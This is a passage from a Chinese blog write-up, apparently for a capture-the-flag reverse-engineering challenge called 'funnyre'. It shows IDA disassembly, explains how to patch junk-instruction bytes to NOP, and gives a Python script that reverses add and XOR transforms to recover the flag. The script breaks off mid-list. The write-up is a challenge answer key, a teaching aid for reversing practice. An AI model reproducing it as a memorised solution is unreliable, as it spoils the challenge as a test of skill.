    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(v89 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1065138106&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;125LL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; v92;
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(a3 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;=&lt;/span&gt; BYTE1(v90);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;经过学习后发现JUMPOUT函数是经典花指令，需要patch去除&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;.text:0000000000400607 loc_400607:                             ; CODE XREF: main+64↓j
.text:0000000000400607                 xor     byte ptr [rdx+rax+5], 91h
.text:000000000040060C                 add     rax, 1
.text:0000000000400610                 cmp     rax, 20h
.text:0000000000400614                 jnz     short loc_400607
.text:0000000000400616                 jz      short near ptr loc_40061A+1
.text:0000000000400618                 jnz     short near ptr loc_40061A+1
.text:000000000040061A
.text:000000000040061A loc_40061A:                             ; CODE XREF: main+66↑j
.text:000000000040061A                                         ; main+68↑j
.text:000000000040061A                 call    near ptr 0FFFFFFFF810037AFh
.text:000000000040061F                 jz      short near ptr loc_400621+2
.text:0000000000400621
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现40061A这个位置其实被跳过了&lt;/p&gt;
&lt;p&gt;将这个位置的数据变为90（即nop）&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 315; 
			flex-basis: 756px&#34;
	&gt;
	&lt;a href=&#34;/post/reverse-from-0-to-1/funnyre_patch.png&#34; data-size=&#34;586x186&#34;&gt;
		&lt;img src=&#34;/post/reverse-from-0-to-1/funnyre_patch.png&#34;
			width=&#34;586&#34;
			height=&#34;186&#34;
			srcset=&#34;/post/reverse-from-0-to-1/funnyre_patch_hu7dea5fa44aec25658c9bcdc2464532b7_8033_480x0_resize_box_3.png 480w, /post/reverse-from-0-to-1/funnyre_patch_hu7dea5fa44aec25658c9bcdc2464532b7_8033_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;按c将其转换回汇编代码&lt;/p&gt;
&lt;p&gt;得到正确代码&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;.text:0000000000400616                 jz      short loc_40061B
.text:0000000000400618                 jnz     short loc_40061B
.text:000000000040061A                 nop
.text:000000000040061B
.text:000000000040061B loc_40061B:                             ; CODE XREF: main+66↑j
.text:000000000040061B                                         ; main+68↑j
.text:000000000040061B                 nop
.text:000000000040061C                 xor     eax, eax
.text:000000000040061E
.text:000000000040061E loc_40061E:                             ; CODE XREF: main+7B↓j
.text:000000000040061E                 xor     byte ptr [rdx+rax+5], 0CDh
.text:0000000000400623                 add     rax, 1
.text:0000000000400627                 cmp     rax, 20h
.text:000000000040062B                 jnz     short loc_40061E
.text:000000000040062D                 xor     eax, eax
.text:000000000040062F
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在ida汇编模式中将后面几个标红的部分进行同样的修改，随后再F5即可查看到正确的代码&lt;/p&gt;
&lt;p&gt;找到函数结尾&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( memcmp(v5 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_4025C0, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20uLL&lt;/span&gt;) )
      JUMPOUT(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;loc_4005BB);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现unk字符串，将其进行如上函数的逆变换，即可得到最终结果&lt;/p&gt;
&lt;p&gt;我选择的方法是复制到vscode然后利用快捷键进行快速复制，最终得到答案&lt;/p&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0xD9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2A&lt;/span&gt;]
add &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]
xor1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0xF9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x96&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x84&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xED&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x86&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x76&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x67&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x98&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x82&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x97&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x62&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEF&lt;/span&gt;]
&lt;span style=&#34;color:#75715e&#34;&gt;# 中间有一个0xff，对应这取反的那个循环&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(res)):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; add:
        res[i] &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; j
        res[i] &lt;span style=&#34;color:#f92672&#34;&gt;%=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(res)):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; xor1:
        res[i] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; j

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(res)):
    res[i] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;
    res[i] &lt;span style=&#34;color:#f92672&#34;&gt;%=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;

xor2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x83&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x53&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x78&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x89&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x94&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x57&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC2&lt;/span&gt;, &lt;span 